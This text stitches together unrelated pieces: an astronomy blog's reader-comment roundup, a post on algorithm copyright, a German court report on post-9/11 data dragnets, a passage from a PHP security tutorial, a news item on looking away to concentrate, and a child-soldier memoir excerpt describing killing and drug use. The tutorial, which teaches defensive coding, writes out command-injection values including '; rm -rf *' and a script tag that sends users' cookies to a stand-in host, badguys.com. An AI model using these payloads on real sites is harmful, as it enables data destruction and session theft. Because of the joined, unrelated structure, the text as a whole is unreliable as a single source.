“ We do not realize what we have on Earth until we leave it . ” - Jim Lovell
Well , the Scienceblogs comments are still on the fritz , requiring me to manually un -spam them one - at - a - time , but Starts With A Bang !
is still going strong with some fabulous stories based on the best knowledge we have !
This next week is poised to be a doozy of a fantastic one , as Treknology is out at last ( Amazon is having a sale on it today , and my copies arrive on Wednesday ) , so next weekend I ’ll have special instructions for you on how to order autographed copies from me .
Also , check out Starts With A Bang on Forbes at 10:01 AM Eastern Time on Monday for the scoop on what promises to be the astronomical story of the year , I promise !
Now , let ’s take a look back at our stories from the past week :
For those of you who like radio , get up very , very early tomorrow ( Monday ) morning , and tune into Coast - to - Coast AM at 3 AM EDT / 12 AM PDT , where I ’ll be their special guest to talk about science , astrophysics , and of course about the science of Star Trek !
With all that on our plate , what more could you ask for ?
How about our comments of the week !
From Sinisa Lazarek on the spirit of the Nobel Prize : “ I ’m actually extremely happy that the Nobel prizes in science are still being given to actual people who are doing something worthwhile and still keeps the spirit of Nobel . ”
I think they made a slam - dunk good decision this year as far as the physics prize goes .
The whole idea of the Nobel Prize is for the person , people , or discovery that did the most to advance a particular discipline of science / humanities for the good of all people on Earth .
It ’s very , very hard to argue that the advances made in physics from being able to detect gravitational waves wo n’t be the greatest advance in astronomy since , perhaps , the launch of Hubble , the first use of multiwavelength astronomy , or even the invention of the telescope .
This is truly a game - changer .
And if you ’re still a doubter , I very much encourage you to pay extremely close attention to Monday ’s news .
Seriously .
From Michael Mooney on what I find offensive : “ Well at least I know now that you rank criticism of your science , as I do , as more offensive than Elle H.C. ’s straight out nasty personal insults . ”
So we are all free to decide what we find more offensive .
On the one hand , we have name - calling .
You know , the kind of stuff we were all subject to when we were prepubescent kids and teenagers ; the lowest ranks on the pyramid .
Sure , it ’s the lowest form of argument and the least able to refute an actual argument .
But then there ’s what you do .
You waltz into a science blog , written by a bona fide scientist , one who is legitimately and independently regarded as one of the best in the world at science communication when it comes to physics , astrophysics , cosmology , and astronomy .
And you babble on nonsensically about how it ’s all wrong , how we ’re all believing in this house - of - cards hoax , and that we do n’t know what science is .
How we ’ve got everything from relativity to quantum physics to astrophysics wrong , and how you know better .
With no substance to anything you say , just confident , uneducated , loud ignorance .
And when your folly is explained to you , it never occurs to you that the time for you to talk is over , and the time to listen is at hand .
Yes , I get it , physics does n’t jibe with your way of making sense with the world .
Therefore , you think physics is wrong .
But it ’s not wrong .
You are .
And although I quite gracefully allow you to shout into the void , you continue to say nothing that contributes productively in any manner , here or anywhere , as far as I can tell .
So keep shouting into the void .
But every time you threaten to leave , all I do is hope .
Because the ship has sailed on me believing you ’ll ever be humble enough to question your own ideas and actually learn something .
But every day is a new chance to get it right .
Maybe today will be your lucky day .
It ’s up to you .
Good luck .
We ’re headed into the science thicket now ; maybe you ’ll enjoy the journey .
From Another Commenter on the number of planets Kepler missed : “ It was a very good start . ”
And this is a point that can not be overstated .
Take a look at the image above .
Prior to Kepler , those purple points you see the ones up by the “ Jupiter ” line , were the only types of points we had , for the most part .
Thanks to Kepler , we ’ve discovered :
Planets down to smaller than Earth - size ,
Around all types of stars in the Universe ,
Orbiting quickly and closely ,
And in a huge number of places .
The majority of planets appear to be peaked at sizes just a bit larger than Earth ( but smaller than Neptune ) , but that ’s also where Kepler was most sensitive .
We basically know more about the inner solar systems of all star - types in the Universe than ever before , and Kepler was that tremendous first step in that regard .
There is more to find , like medium - sized planets around large stars , the middle - to - outer solar systems , and the smallest , Mercury - sized planets and smaller around everyone .
But that takes nothing away from the spectacular science that Kepler actually undertook !
From eric on the reviews of the new Star Trek : “ “ Black Alert ” sounds like something the Wayans Brothers would put on a Star Trek send up . ”
I would watch the hell out of that .
From Steve Blackband on his level of Star Trek fandom : “ I am the physicist / astronomy nutcase that pushed Neil Armstrong out of the way to get to Nichelle Nichols after all .
Very embarrassing . ”
This is a story I would actually love to hear .
The self - flagellation you must feel you deserve ought to be tremendous … and yet you ’re secure enough to own up to it .
That ’s incredible to come to terms with that .
Good on you !
From Adam on why the spore technology never shows up in Star Trek : “ The more I think about the spore drive and the lack of spore drive in any other Star Trek show , the more it feels like a huge plot hole for the series .
I ’m guessing that the tech is going to be lost at some point , because it ’s never seen again , and since all the info for it is self contained on the star ship Discovery .
However , we ’ve seen countless other civilizations over the various shows , and none of them have this tech either . ”
So I ’ve got two theories on that : the Orson Scott Card theory and the Wesley Crusher theory .
The OSC theory is based on the descolada / recolada storyline from his Ender ’s Quartet series .
That these spores exist throughout the galaxy , but they are biologically dangerous and need to be modified .
We use genetic modification to silence the dangerous part of their genetic makeup , but it renders the “ spore drive ” unusable .
The Wesley Crusher theory is that the “ spore drive ” is what the Traveler uses to go throughout space and even time , and when Wesley goes to apprentice for him , that ’s what he learns to connect with as well .
But it ’s a lost art ( and science ) that only a select few can still connect with .
More likely , it ’s just a giant plot hole that they ’re digging , and they ’re going to need a deus ex machina to get out of it .
From Denier on the end of Commander Landry : “ In all seriousness , there was a moment in ST : D when the chief of security was working with Michael to drop the force field to the tardigrade pen , and I thought for half a second : “ No big deal .
The Chief of Security is far and away the strongest person on board ” . ”
And after half a second , you realized that you misspelled “ dumbest , ” which is a pretty high bar considering the level of crazy aboard that ship in general .
Clearly nobody cared ; she did n’t even get a funeral .
You always hate to see a character that you ’re told is smart , capable , competent , and so on , act in a way that ’s antithetical to that .
I personally cringe even more when it ’s an underrepresented character , as I feel that ’s just supporting the stereotype that , in this case , “ women are no good at X . ”
It ’s like the old xkcd comic :
And that ’s just too bad .
It would n’t have been hard to substitute some dumb , disposable redshirt , and keep one of the three major women characters alive , considering another one ( Michelle Yeoh ’s Captain Georgiou ) was killed just two episodes ago .
So we ’ve got Lilly and Burnham , and they ’re roommates , and that ’s it for major women aboard the show now .
The worst part ?
I did n’t even notice that , until a woman I was watching with pointed it out to me .
From Dunc on whether Star Trek is scientific nonsense or not : “ So , exactly like every other Star Trek then ?
ST has never really been hard sci - fi – it ’s always been filled with sciency - sounding bafflegab and magical technology that has exactly whatever capabilities and limits the writers require at that moment in time ( and change wildly from episode to episode ) .
I mean , I love Star Trek , and I ’ve been ( re ) watching its different incarnations on a more - or - less continuous loop for almost my entire life , but let ’s not pretend that this is a radical departure . ”
There ’s something different about Discovery , though .
I ’m still struggling to put my finger on it , but the best I ’ve got goes something like this :
In previous incarnations of Star Trek , there was a new technology that was indistinguishable from magic that worked .
The science behind it was vague , loosely - based in what we knew , and not enunciated very clearly or with certainty .
The tech then made up new words to indicate that there were additional advances that included information that ’s well beyond our current knowledge set .
And then scientists or science / tech - enthusiasts could fill in the blanks to make it feasible .
With Discovery , though , they ’re trying to use actual , recent science news as the basis or justification for ideas that only follow if you misinterpret that science .
I may not be explaining myself well , but that ’s a big difference : from the edge of science with wiggle - room that then imagines new applications , to recent - but - well - understood science that gets twisted to mean something it never meant , and then taken to an extreme that pushes it into the realm of , “ hey this is ruled out already given what we know but we ’re plowing ahead anyway . ”
It may be only me who ’s having trouble suspending my disbelief for it , but that ’s what I ’m seeing .
From Sean
T on the missing normal matter in the Universe : “ The “ missing matter ” discussed in this post is normal matter .
We know from real , actual observations of how things gravitate that we were not seeing all of the normal matter that exists .
This WHIM is at least some of that missing normal matter . ”
We know how much normal matter is in the Universe , folks .
There really is n’t an argument on it : it ’s ~ 5 % of the critical density .
It ca n’t be 10 % , or 20 % or 30 % .
It definitely ca n’t be 100 % .
And if you really want to know , it ca n’t even be 6 % .
Why not ?
The above measurements , from Big Bang Nucleosynthesis .
If you want to make the light elements in the Universe , the elements we start off with after the Big Bang but before the first stars , you need to run the equations , and they ’re dependent on the baryon - to - photon ratio .
We count the CMB photons and know how many there are , so that means the only free parameter is the baryon density ( i.e. , normal matter density ) of the Universe .
We observe the Helium - 4 , Helium - 3 , Deuterium , and Lithium - 7 abundances in the Universe , and they are consistent with a baryon - to - photon ratio that gives the same Universe that WMAP and Planck gave : one with 5 % of the Universe ’s critical density being baryons .
The new “ missing matter ” found is a part of that 5 % .
That ’s what this discovery is ; that ’s what it says ; that ’s what it shows .
That ’s the story here .
Anything else you ’ve read into it to the contrary is wrong .
From Frank on the state of the world of physics : “ The world of physics may seem bleak now to some but I think we maybe really close to TOE . ”
I think the opposite on both counts : I think the world of physics is incredibly bright , and there are so many interesting avenues to investigate .
But I think there are many building their way to the dream of a theory - of - everything , and that path is proving quite fruitless .
But we all have our own opinions , and you are entitled to yours !
On the other hand , we have three interesting comments about how to be wrong .
From Michael Mooney : “ “ How To Be Wrong ” is very simple .
Do n’t assume you “ know it all ” already .
Imagine being an unbiased scientist . ”
As a scientist , I very clearly and openly do n’t assume I know it all , and am very open to challenging every assumption , result , and conclusion out there .
But only when the evidence warrants it .
In other words , I am biased in the direction that the evidence points .
On the other hand , I can encourage you to look inward and ask yourself those same questions .
Has it ever occurred to you that you , as a non-physicist , non-scientist , and non-expert in this arena , do n’t know very much about it ?
That you do n’t have anything of value to offer to this discussion ?
That you should be in the position of closing your mouth and opening your mind , and listening to what those who ’ve spent a lifetime studying this have to say about it ?
And that your vision of an “ unbiased scientist ” may be an utter abuse of science in and of itself ?
From eric : “ I ’m in the process of teaching my kid lots of games .
Like many small children , he does n’t like to lose .
But the more games he plays , the thicker the skin he gets .
And the more he does it , the more he thinks about the overall activity rather than the outcome of any specific game .
“ Daddy won , I ’m upset ” becomes “ Daddy won 6 of the last 10 and I won 4 … pretty good ” hopefully will become in the future “ I have no idea who ’s won more games this week .
Play on ! ” I think that ’s a lot like science .
People who do a little of it , or who have one single idea they focus on , tend to worry about whether it ’s going to ‘ win . ’
Professional scientists , OTOH , tend more towards the attitude of “ hey , 2 of my 50 papers have stood the test of time .
Cool ! ”
Or even “ what , that paper of mine is still kicking around ?
I lost track .
Who knew ? ”
The activity becomes the focus , rather than the success or failure of any individual effort ’s outcome . ”
I like this interpretation .
It ’s not so much “ how to be wrong ” as it is “ how to lose , ” where being wrong is a specific form / special case of losing .
Do n’t be sad for the times you lose ; all of us must come to terms with it , as you cannot win all the time .
This is a valuable lesson , and should make you appreciate the times you were right ( or won ) all the more .
From GregH : “ 1 . Thanks Ethan , for STEALING MY IDEA and writing it up better than I could .
2 . Interesting that none of the comments here address being wrong .
( Including this one . )
Sure , it ’s epistemology , but ….?
3 . Paging Dr. Dunning & possibly Dr. Kruger .
Dr. Dunning , white courtesy telephone please . ”
Hey , if I could invade people ’s heads and steal their ideas , I would be a lot more successful than I am .
From Anonymous
Coward , summarizing what is and is n’t scientific about the multiverse : “ It ’s not a scientific theory because it ca n’t be tested as the other known laws of physics seem to preclude any possibility of testing it .
But it does fall out as an intriguing consequence of the other bits of theory that do have observational consequences that can and have been successfully tested . ”
Boom .
You nailed it .
I ’m glad to see that I have successfully communicated the science of this to at least one person out there .
And I know it ’s more than one , because some people seem to actually understand what I ’m getting at , and what the purpose ( and value ) of what I do is .
They ’re just mostly silent here .
Which is why I appreciate Sean T‘s comment : “ … this blog is NOT a scientific journal .
It is an attempt to communicate the current scientific consensus , along with other speculative ideas that may prove fruitful , to an audience that is composed of non-experts in the relevant scientific fields .
The audience includes fellow physicists , other scientists who are not physicists ( I fall into this category ) , and non-scientists .
This type of communication can be very difficult due to the variety of the audience , and I personally think it ’s well done , which is why I continue to read Ethan ’s blog .
However , much like all science , the topics covered here ALL come with the same caveats — that this is our current best understanding of things and that this understanding might well change as new observations come to light . ”
Everything is subject to revision .
I have no doubt that if we continue to do science at the rate that we ’ve done it over the past few hundred years , then by time the year 3,000 rolls around , we ’ll look at much of our modern understanding of things the way we look at Copernicus ’ or even Ptolemy ’s “ Universe ” today : as quaint , as the beginnings of science , but full of bad ideas and assumptions that we did n’t even recognize .
But we may look at it only as we look at Newton ’s : as incredibly good , and fundamentally flawed and limited in a few ways , but super successful for its time and what it did nonetheless .
We are always learning and growing .
And finally , from bone - picker Art Glick on the Apollo 8 ‘ Earthrise ’ photo : “ I have a bone to pick with the person that named Bill Anders Apollo 8 photo “ Earthrise ” .
They clearly did not understand the mechanics of the Earth - Moon system .
The Earth does not “ rise ” on the Moon .
I wonder how many people realize that if you lived on the Moon the Earth would hang in the same spot in the sky eternally .
It would go through phases like the Moon does , but it would never change its position .
The only reason that Anders saw the Earth “ rise ” is because his craft was orbiting the Moon at the time .
To refer to the Earth “ rising ” from the Moon is just wrong . ”
I presume you have the same bone to pick with the person who called it “ sunrise ” or “ moonrise ” since the Earth was rotating , not that any of these celestial objects were rising ?
I assume as well that you object to ISS astronauts claiming to see 16 “ sunsets ” in a day , since they ’re only seeing the same effect over and over again as they go around the Earth ?
I ca n’t tell you who first called it “ Earthrise ” ( I do n’t know ) , but I can give you Bill Anders ’ recount of the photo itself .
After they came around the Moon for their third orbit , they saw Earth appear over the limb of the Moon .
“ I do n’t know who said it , maybe all of us said , ‘ Oh my God .
Look at that !
And up came the Earth .
We had had no discussion on the ground , no briefing , no instructions on what to do .
I jokingly said , ‘ well it ’s not on the flight plan , ’ and the other two guys were yelling at me to give them cameras .
I had the only color camera with a long lens .
So I floated a black and white over to Borman .
I ca n’t remember what Lovell got .
There were all yelling for cameras , and we started snapping away . ”
It ’s incredible to imagine what that sight must be like .
For those three men in 1968 , there is no better word than “ Earthrise ” to describe what they saw .
Let them have it ; they experienced it and we did n’t .
Maybe , someday , it wo n’t be such an uncommon experience , after all .
Go get your copy of Treknology now , and I ’ll see you back here tomorrow for more incredible science and stories here on Starts With A Bang !
Are algorithms copyrightable ?
December 4 , 2006
Posted by Imran Ghory in Copyright
( disclaimer : I am not a lawyer , this article is personal opinion )
If I was asked a few days ago “ can an algorithm be copyrighted ? ” , I would have replied with the canned answer “ no , of course not , copyright protects the expression of an idea , not the idea that ’s expressed . ”
However since reading Hart & Fazzani ’s Intellectual Property Law ( part of the Palgrave law series ) .
I was no longer convinced so I decided to google to see if anyone else had discussed it .
But other than the canned answer I gave above I could n’t find any firm evidence supporting the uncopyrightable status of algorithms .
And during my searches I found the submission policy of ACM Algorithms which clearly indicates that they at least believe some algorithms to be copyrightable .
Generally speaking if you translate a program from one programming language to another then you have to have permission from the original author of the program ( in the same way you would need permission to translate a book from say English into Spanish ) .
The Palgrave book specifically gives the example of translating from FORTRAN to COBOL as being a type of “ adaptation ” that requires permission .
In Canada Apple Computer Inc v Mackintosh Computers Ltd. came to a similar conclusions .
So why should translating an algorithm from pseudo - code into an programming language be any different , I ’m sure most implementations of binary search are based on text - book pseudo - code rather than derivation from first - principles .
The obvious counter - response for this has been that if an idea can only be expressed in one form then it ’s not copyrightable .
However in the UK at least this does n’t appear to be true if the idea is sufficiently complex .
In the case Ibcos Computers Ltd v Barclays Mercantile Highland Finance Ltd ( 1994 ) which is one of the most important software copyright cases in the UK it was decided that “ copyright cannot prevent the copying of a mere general idea but can protect the copying of a detailed idea ” and this is a decision which has been referred to and affirmed in a number of court cases since that time .
And “ detailed idea ” is a concept which will almost certainly apply to most modern algorithms .
As far as I know no - one ’s ever taken an algorithm copyright case to court ( possibly because such court cases over algorithms have traditionally been in the US where patent law can be applied instead of copyright ) , but it could just be a matter of time before it happens and possibly opens up a huge can of worms .
Die bundesweite Rasterfahndung nach so genannten Schläfern in der Zeit nach dem 11 .
September 2001 war verfassungswidrig .
Das hat das Bundesverfassungsgericht entschieden .
Nach einem heute veröffentlichten Beschluss ist eine solche massenhafte Datenermittlung nur bei einer " konkreten Gefahr für hochrangige Rechtsgüter " erlaubt .
Eine allgemeine Bedrohungslage , wie sie seit den Terroranschlägen von New York und Washington " praktisch ununterbrochen " bestanden habe , reiche nicht aus .
Damit gab das Karlsruher Gericht einem 1978 geborenen Marokkaner Recht .
Der damalige Student an der Universität Düsseldorf wähnte sich im Visier der Ermittler .
Die Maßnahme verletze sein Recht auf informationelle Selbstbestimmung .
Zwei der acht Richter stimmten gegen die Entscheidung ( Az : 1 BvR 518/02 , Beschluss vom 4 . April 2006 ) .
Der schriftlich veröffentlichte Beschluss gilt unmittelbar nur für Nordrhein - Westfalen , hat jedoch bundesweite Bedeutung , weil die schon Wochen nach den Anschlägen angelaufene Rasterfahndung über alle Bundesländer hinweg koordiniert war .
Das Gericht deutete an , dass die Gesetze der meisten anderen Bundesländer nachgebessert werden müssen , weil sie Rasterfahndungen auch ohne die vom Gericht nun geforderte " konkrete Gefahr " erlauben .
Das nordrhein - westfälische Polizeigesetz selbst blieb unbeanstandet , weil es ausreichend hohe Hürden aufstelle , die lediglich von den Gerichten nicht ausreichend beachtet worden seien .
Gesucht wurde damals nach männlichen Studenten oder Ex-Studenten islamischen Glaubens zwischen 18 und 40 Jahren , die aus arabischen Ländern stammten .
Bei der koordinierten Aktion hatten Einwohnermeldeämter , Universitäten und das Ausländerzentralregister mehr als acht Millionen Datensätze – 5,2 Millionen allein in Nordrhein - Westfalen – an die Polizei weitergeleitet .
Nach einer ersten Rasterung wurden 32.000 Datensätze ans Bundeskriminalamt ( BKA ) übermittelt und dort in die Verbunddatei " Schläfer " eingestellt .
Islamistische Terroristen seien dadurch , soweit ersichtlich , nicht enttarnt worden , heißt es in dem Beschluss .
Der Erste Senat – federführend vorbereitet wurde der Beschluss von Wolfgang Hoffmann - Riem – bekräftigte zwar , dass der Staat terroristischen Bedrohungen wirksam entgegentreten müsse und seine polizeilichen Instrumente angesichts neuer Gefährdungen auch fortentwickeln dürfe .
Dabei sei er aber auf rechtsstaatliche Mittel beschränkt : " Die Balance zwischen Freiheit und Sicherheit darf vom Gesetzgeber neu justiert , die Gewichte dürfen jedoch von ihm nicht grundlegend verschoben werden . "
Eine Rasterfahndung ist dem Gericht zufolge nicht bereits vor einer " konkreten " , durch Tatsachen begründeten Gefahr zulässig , weil sonst ohne jeglichen Verdacht tief greifende Eingriffe in Grundrechte möglich würden .
Außenpolitische Spannungslagen , die von Terroristen für Anschläge genutzt werden könnten , gebe es immer wieder , weshalb die Gefahr eines Anschlags in Deutschland praktisch nie ausgeschlossen sei .
Eine Rasterfahndung dagegen setze konkrete Anhaltspunkte für Anschlagsplanungen oder den Aufenthalt von Terroristen in Deutschland voraus .
Der Senat wertete die Rasterfahndung als erheblichen Eingriff in das " Datenschutz - Grundrecht " .
Denn davon seien auch private , vertrauliche Informationen etwa zur Glaubensüberzeugung betroffen .
Außerdem lasse sich aus der Vielzahl von Daten womöglich ein vollständiges Persönlichkeitsbild zusammenfügen .
Erschwerend für die Betroffenen kommt laut Gericht das Risiko hinzu , mit polizeilichen Ermittlungen überzogen und als Ausländer muslimischen Glaubens stigmatisiert zu werden .

This article was written in 2005 and remains one of our most popular posts .
If you ’re keen to learn more about web security , you may find this recent article of great interest .
PHP is a terrific language for the rapid development of dynamic Websites .
It also has many features that are friendly to beginning programmers , such as the fact that it does n’t require variable declarations .
However , many of these features can lead a programmer inadvertently to allow security holes to creep into a Web application .
The popular security mailing lists teem with notes of flaws identified in PHP applications , but PHP can be as secure as any other language once you understand the basic types of flaws PHP applications tend to exhibit .
In this article , I ’ll detail many of the common PHP programming mistakes that can result in security holes .
By showing you what not to do , and how each particular flaw can be exploited , I hope that you ’ll understand not just how to avoid these particular mistakes , but also why they result in security vulnerabilities .
Understanding each possible flaw will help you avoid making the same mistakes in your PHP applications .
Security is a process , not a product , and adopting a sound approach to security during the process of application development will allow you to produce tighter , more robust code .
Unvalidated Input Errors
One of — if not the — most common PHP security flaws is the unvalidated input error .
User - provided data simply cannot be trusted .
You should assume every one of your Web application users is malicious , since it ’s certain that some of them will be .
Unvalidated or improperly validated input is the root cause of many of the exploits we ’ll discuss later in this article .
As an example , you might write the following code to allow a user to view a calendar that displays a specified month by calling the UNIX cal command .
$ month = $ _GET [ ' month ' ] ;
$ year = $ _GET [ ' year ' ] ;
exec ( " cal $ month $ year " , $ result ) ;
print " < PRE > " ;
foreach ( $ result as $ r ) { print " $r < BR > " ; }
print " </ PRE > " ;
This code has a gaping security hole , since the $ _GET [ month ] and $ _GET [ year ] variables are not validated in any way .
The application works perfectly , as long as the specified month is a number between 1 and 12 , and the year is provided as a proper four - digit year .
However , a malicious user might append " ; ls - la " to the year value and thereby see a listing of your Website ’s html directory .
An extremely malicious user could append " ; rm - rf * " to the year value and delete your entire Website !
The proper way to correct this is to ensure that the input you receive from the user is what you expect it to be .
Do not use JavaScript validation for this ; such validation methods are easily worked around by an exploiter who creates their own form or disables javascript .
You need to add PHP code to ensure that the month and year inputs are digits and only digits , as shown below .
$ month = $ _GET [ ' month ' ] ;
$ year = $ _GET [ ' year ' ] ;
if ( ! preg_match ( " / ^[ 0 - 9 ] { 1,2}$ / " , $ month ) ) die ( " Bad month , please re-enter . " ) ;
if ( ! preg_match ( " / ^[ 0 - 9 ] {4} $ / " , $ year ) ) die ( " Bad year , please re-enter . " ) ;
exec ( " cal $ month $ year " , $ result ) ;
print " < PRE > " ;
foreach ( $ result as $ r ) { print " $r < BR > " ; }
print " </ PRE > " ;
This code can safely be used without concern that a user could provide input that would compromise your application , or the server running it .
Regular expressions are a great tool for input validation .
They can be difficult to grasp , but are extremely useful in this type of situation .
You should always validate your user - provided data by rejecting anything other than the expected data .
Never use the approach that you ’ll accept anything except data you know to be harmful — this is a common source of security flaws .
Sometimes , malicious users can get around this methodology , for example , by including bad input but obscuring it with null characters .
Such input would pass your checks , but could still have a harmful effect .
You should be as restrictive as possible when you validate any input .
If some characters do n’t need to be included , you should probably either strip them out , or reject the input completely .
Access Control Flaws
Another type of flaw that ’s not necessarily restricted to PHP applications , but is important nonetheless , is the access control type of vulnerability .
This flaw rears its head when you have certain sections of your application that must be restricted to certain users , such as an administration page that allows configuration settings to be changed , or displays sensitive information .
You should check the user ’s access privileges upon every load of a restricted page of your PHP application .
If you check the user ’s credentials on the index page only , a malicious user could directly enter a URL to a " deeper " page , which would bypass this credential checking process .
It ’s also advisable to layer your security , for example , by restricting user access on the basis of the user ’s IP address as well as their user name , if you have the luxury of writing an application for users that will have predictable or fixed IPs .
Placing your restricted pages in a separate directory that ’s protected by an apache .htaccess file is also good practice .
Place configuration files outside your Web - accessible directory .
A configuration file can contain database passwords and other information that could be used by malicious users to penetrate or deface your site ; never allow these files to be accessed by remote users .
Use the PHP include function to include these files from a directory that ’s not Web - accessible , possibly including an .htaccess file containing " deny from all " just in case the directory is ever made Web - accessible by adiminstrator error .
Though this is redundant , layering security is a positive thing .
For my PHP applications , I prefer a directory structure based on the sample below .
All function libraries , classes and configuration files are stored in the includes directory .
Always name these include files with a . php extension , so that even if all your protection is bypassed , the Web server will parse the PHP code , and will not display it to the user .
The www and admin directories are the only directories whose files can be accessed directly by a URL ; the admin directory is protected by an .htaccess file that allows users entry only if they know a user name and password that ’s stored in the .htpasswd file in the root directory of the site .
/home
/ httpd
/www.example.com
. htpasswd
/ includes
cart.class.php
config.php
/logs
access_log
error_log
/ www
index.php
/admin
. htaccess
index.php
You should set your Apache directory indexes to ‘ index. php ’ , and keep an index . php file in every directory .
Set it to redirect to your main page if the directory should not be browsable , such as an images directory or similar .
Never , ever , make a backup of a php file in your Web - exposed directory by adding .bak or another extension to the filename .
Depending on the Web server you use ( Apache thankfully appears to have safeguards for this ) , the PHP code in the file will not be parsed by the Web server , and may be output as source to a user who stumbles upon a URL to the backup file .
If that file contained passwords or other sensitive information , that information would be readable — it could even end up being indexed by Google if the spider stumbled upon it !
Renaming files to have a .
bak. php extension is safer than tacking a . bak onto the .php extension , but the best solution is to use a source code version control system like CVS .
CVS can be complicated to learn , but the time you spend will pay off in many ways .
The system saves every version of each file in your project , which can be invaluable when changes are made that cause problems later .
Session ID Protection
Session ID hijacking can be a problem with PHP Websites .
The PHP session tracking component uses a unique ID for each user ’s session , but if this ID is known to another user , that person can hijack the user ’s session and see information that should be confidential .
Session ID hijacking cannot completely be prevented ; you should know the risks so you can mitigate them .
For instance , even after a user has been validated and assigned a session ID , you should revalidate that user when he or she performs any highly sensitive actions , such as resetting passwords .
Never allow a session - validated user to enter a new password without also entering their old password , for example .
You should also avoid displaying truly sensitive data , such as credit card numbers , to a user who has only been validated by session ID .
A user who creates a new session by logging in should be assigned a fresh session ID using the session_regenerate_id function .
A hijacking user will try to set his session ID prior to login ; this can be prevented if you regenerate the ID at login .
If your site is handling critical information such as credit card numbers , always use an SSL secured connection .
This will help reduce session hijacking vulnerabilities since the session ID cannot be sniffed and easily hijacked .
If your site is run on a shared Web server , be aware that any session variables can easily be viewed by any other users on the same server .
Mitigate this vulnerability by storing all sensitive data in a database record that ’s keyed to the session ID rather than as a session variable .
If you must store a password in a session variable ( and I stress again that it ’s best just to avoid this ) , do not store the password in clear text ; use the sha1 ( ) ( PHP 4.3 + ) or md5 ( ) function to store the hash of the password instead .
if ( $_SESSION [' password ' ] == $ userpass ) {
// do sensitive things here
}
The above code is not secure , since the password is stored in plain text in a session variable .
Instead , use code more like this :
if ( $_SESSION [ ' sha1 password ' ] == sha1 ( $userpass ) ) {
// do sensitive things here
}
The SHA - 1 algorithm is not without its flaws , and further advances in computing power are making it possible to generate what are known as collisions ( different strings with the same SHA - 1 sum ) .
Yet the above technique is still vastly superior to storing passwords in clear text .
Use MD5 if you must — since it ’s superior to a clear text - saved password — but keep in mind that recent developments have made it possible to generate MD5 collisions in less than an hour on standard PC hardware .
Ideally , one should use a function that implements SHA - 256 ; such a function does not currently ship with PHP and must be found separately .
For further reading on hash collisions , among other security related topics , Bruce Schneier ’s Website is a great resource .
Cross Site Scripting ( XSS ) Flaws
Cross site scripting , or XSS , flaws are a subset of user validation where a malicious user embeds scripting commands — usually JavaScript — in data that is displayed and therefore executed by another user .
For example , if your application included a forum in which people could post messages to be read by other users , a malicious user could embed a < script > tag , shown below , which would reload the page to a site controlled by them , pass your cookie and session information as GET variables to their page , then reload your page as though nothing had happened .
The malicious user could thereby collect other users ’ cookie and session information , and use this data in a session hijacking or other attack on your site .
< script >
document.location =
' http://www.badguys.com/cgi-bin/cookie.php?' +
document.cookie ;
</script >
To prevent this type of attack , you need to be careful about displaying user - submitted content verbatim on a Web page .
The easiest way to protect against this is simply to escape the characters that make up HTML syntax ( in particular , < and > ) to HTML character entities ( < and > ) , so that the submitted data is treated as plain text for display purposes .
Just pass the data through PHP ’s htmlspecialchars function as you are producing the output .
If your application requires that your users be able to submit HTML content and have it treated as such , you will instead need to filter out potentially harmful tags like < script > .
This is best done when the content is first submitted , and will require a bit of regular expressions know - how .
The Cross Site Scripting FAQ at cgisecurity.com provides much more information and background on this type of flaw , and explains it well .
I highly recommend reading and understanding it .
XSS flaws can be difficult to spot and are one of the easier mistakes to make when programming a PHP application , as illustrated by the high number of XSS advisories issued on the popular security mailing lists .

Gazing into the middle distance improves your concentration .
Look away : staring at faces can stop students from thinking clearly .
Punchstock
Teachers everywhere can be heard shouting " look at me when I 'm talking to you " .
But research presented today at the British Association 's Festival of Science in Norwich , UK , suggests that they should be doing exactly the opposite .
When posed with a conundrum , it is normal for adults and older children to look away , staring in an unfocused way out of the window or at a patch of the carpet .
This aimless gaze is n't necessarily thanks to an attitude of indifference or indolence , but instead might be helping the brain to concentrate .
Researchers at the University of Stirling in Scotland took a group of 25 five - year - olds and trained them to look away when they were being asked a question .
The effect was a significant increase in correct answers to mental arithmetic questions , says Gwyneth Doherty - Sneddon , who led the research .
She declined to give details as the work is in press with the British Journal of Developmental Psychology .
Further experiments by the same group showed that the difficulty of both looking at a face and thinking about maths is so extreme it can cause a physiological response .
In one study , around 30 adults were asked to perform a task requiring concentration , such as counting backwards from 100 in increments of 7 , while staring at a human face .
The combination of mental effort and emotional confusion caused the subjects to break out in a sweat .
The sweatiest subjects , Doherty - Sneddon adds , were men being tested by a female researcher .

We are so distracted by the barrage of emotional information transmitted in faces that it stops us from thinking clearly , Doherty - Sneddon says .
So does this mean that teachers should be encouraging their students to look away from them ?
Doherty - Sneddon certainly thinks so .
" I do this with my own kids while they 're doing their homework " she says .
" If they 're looking at me then I know they 're not concentrating . "

We took the guns and ammunition off the bodies of my friends and left them there in the forest , which had taken on a life of its own , as if it had trapped the souls that had departed from the dead .
The branches of the trees seemed to be holding hands and bowing their heads in prayer .
In the swamp , crabs had already begun feasting on the eyes of the dead .
Limbs and fragmented skulls lay on top of the bog , and the water in the swamp was stagnant with blood .
I was not afraid of these lifeless bodies .
I despised them and kicked them to flip them and take their guns .
I found a G3 and some ammunition .
I noticed that most of the dead gunmen and boys wore lots of jewelry on their necks and wrists .
We arrived in the village , our base , with nightfall and sat against the walls of houses .
It was quiet , and perhaps afraid of the silence , we began cleaning the blood off our guns , oiling their chambers , and shooting them into the air to test their effectiveness .
I went for supper that night but was unable to eat .
I only drank water and felt nothing .
I lay on my back in the tent with my AK - 47 on my chest and the G3 I had taken from a dead rebel leaning on the peg of the tent .
Nothing happened in my head .
It was a void , and I stared at the roof of the tent until I was miraculously able to doze off .
I had a dream that I was picking up Josiah from the tree stump and a gunman stood on top of me .
He placed his gun against my forehead .
I immediately woke up from my dream and began shooting inside the tent , until the 30 rounds in the magazine were finished .
The corporal and the lieutenant came in afterward and took me outside .
I was sweating , and they threw water on my face and gave me a few white capsules .
They were the same capsules that we ’d all been given before we had gone into battle , and to this day , I do not know what they contained .
I stayed up all night and could n’t sleep for days .
We went out two more times that week , and I had no problem shooting my gun .
Rebel Raids
After that first week of going out on raids to kill people we deemed our rebel enemies or sympathizers of the rebels , our initiation was complete .
We stayed put at the base , and we boys took turns guarding posts around the village .
We smoked marijuana and sniffed “ brown brown , ” cocaine mixed with gunpowder , which was always spread out on a table near the ammunition hut , and of course I took more of the white capsules , as I had become addicted to them .
The first time I took all these drugs at the same time , I began to perspire so much that I took off all my clothes .
My body shook , my sight became blurred and I lost my hearing for several minutes .
I walked around the village restlessly .
But after several doses of these drugs , all I felt was numbness to everything and so much energy that I could n’t sleep for weeks .
